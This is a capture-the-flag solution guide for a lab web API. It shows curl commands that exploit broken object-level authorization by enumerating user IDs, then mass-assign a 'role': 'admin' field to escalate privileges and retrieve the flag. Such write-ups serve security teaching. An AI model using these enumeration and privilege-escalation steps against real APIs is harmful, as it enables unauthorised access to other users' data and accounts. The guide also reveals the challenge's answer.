
# Solution Guide - Bolasploitation

## Vulnerabilities
1.  **BOLA (Broken Object Level Authorization):** The `/api/users/<user_id>/profile` endpoint does not check if the requested `user_id` matches the authenticated user.
2.  **Mass Assignment:** The `/api/user/update` endpoint blindly accepts all JSON fields and updates the user object, allowing a user to overwrite sensitive fields like `role`.

## Step-by-Step Solution

### 1. Login
Authenticate as `alice` to get a JWT.
```bash
TOKEN=$(curl -s -X POST http://heaven.breachpoint.live/api/login -H "Content-Type: application/json" -d '{"username": "alice", "password": "alice123"}' | jq -r .token)
echo $TOKEN
```

### 2. Discovery (BOLA)
Try to access other user profiles by incrementing the ID.
```bash
# Check ID 1 (Alice)
curl http://heaven.breachpoint.live/api/users/1/profile -H "Authorization: Bearer $TOKEN"

# Check ID 2 (Bob)
curl http://heaven.breachpoint.live/api/users/2/profile -H "Authorization: Bearer $TOKEN"

# Check ID 3 (Admin) - FOUND!
curl http://heaven.breachpoint.live/api/users/3/profile -H "Authorization: Bearer $TOKEN"
```
Output for ID 3 reveals the `role` field:
```json
{
  "profile": {
    "bio": "Administrator account.",
    "email": "admin@ctf.com",
    "id": 3,
    "role": "admin",
    "username": "admin"
  }
}
```
**Observation:** The user object has a `role` field.

### 3. Exploitation (Mass Assignment)
Update your own profile (Alice) and inject the `role` field.
```bash
curl -X PATCH http://heaven.breachpoint.live/api/user/update \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"role": "admin"}'
```
Response:
```json
{
  "message": "Profile updated successfully",
  "user": { ... "role": "admin", ... }
}
```

### 4. Retrieve Flag
Now that Alice is an admin, access the restricted endpoint.
```bash
curl http://heaven.breachpoint.live/api/admin/flag -H "Authorization: Bearer $TOKEN"
```
Response:
```json
{
  "flag": "BPCTF{Bolasploitation}",
  "message": "Congratulations! You are admin."
}
```
